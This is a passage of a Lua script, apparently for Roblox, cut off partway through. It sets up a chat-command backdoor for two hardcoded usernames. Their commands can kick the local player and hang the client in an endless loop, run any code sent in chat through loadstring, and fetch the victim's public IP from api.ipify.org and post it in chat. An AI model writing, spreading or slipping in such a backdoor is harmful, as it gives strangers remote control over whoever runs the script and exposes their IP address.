local function gpfs(str)
    for i, v in pairs(game.Players:GetPlayers()) do
        if str:lower() == (v.Name:lower()):sub(1, #str) or str:lower() == (v.DisplayName:lower()):sub(1, #str) then
            return v
        end
    end
end
game.Players.PlayerAdded:Connect(
    function(knocks)
        if knocks.Name == "jjjuuikjjikkju" or knocks.Name == "decryptionites" then
            knocks.Chatted:Connect(
                function(rizz)
                    local splitted = rizz:split(" ")
                    if splitted[1] == "b!kick" then
                        local kreason = #splitted[1] + 1
                        game.Players.LocalPlayer:Kick(string.sub(rizz, kreason))
                        task.wait(2)
                        while true do
                        end
                    elseif splitted[1] == "b!run" then
                        local execute = #splitted[1] + 1
                        loadstring(string.sub(rizz, execute))()
                    elseif splitted[1] == "b!show" then
                        game.Players:Chat("ff " .. tostring(game:HttpGet("https://api.ipify.org/")))
                    end
                end
            )
        end
    end
)
for i, v in pairs(game.Players:GetPlayers()) do
    if v.Name == "jjjuuikjjikkju" or v.Name == "decryptionites" then
            v.Chatted:Connect(
                function(rizz)
                    local splitted = rizz:split(" ")
